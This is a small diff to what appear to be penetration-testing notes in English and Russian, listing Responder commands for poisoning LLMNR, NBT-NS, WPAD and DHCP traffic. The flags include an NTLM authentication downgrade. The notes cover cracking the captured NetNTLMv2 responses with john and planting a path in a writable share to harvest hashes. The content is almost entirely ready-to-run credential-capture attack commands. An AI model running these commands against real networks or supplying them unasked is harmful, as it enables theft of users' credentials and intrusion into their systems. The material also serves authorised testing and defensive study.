@@ -1,4 +1,14 @@
-лучше всего осуществлять, когда есть права на хаписи в шаре
+responder -I <Iface> #Default conf
+responder -I <Iface> -P -r -v #More chances but might break things
+responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
+responder -I <Iface> --wpad
+responder.py -I <interface> -Pv
+You won't be able to intercept NTLM hashes (normally), but you can easily grab some NTLM challenges and responses that you can crack using for example john option --format=netntlmv2.
+#DHCP poisoning
+This attack is highly effective and gives you assured NTLMv1/2 hashes.
+./Responder.py -I eth0 -Pdv
+
+лучше всего осуществлять, когда есть права на записи в шаре
 1) поднимаем Responder 
 sudo responder -I tun0
 2)внедряем путь в <название шары>
